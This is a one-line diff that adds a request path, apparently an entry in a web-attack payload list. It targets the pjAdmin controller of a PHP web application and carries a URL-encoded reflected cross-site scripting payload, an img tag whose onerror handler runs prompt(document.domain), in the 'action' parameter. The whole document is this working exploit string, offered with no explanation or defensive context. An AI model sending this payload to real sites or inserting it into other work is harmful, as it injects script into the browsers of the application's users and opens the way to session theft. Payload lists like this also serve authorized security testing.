@@ -1,0 +1,1 @@
+/index.php?controller=pjAdmin&action=%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E
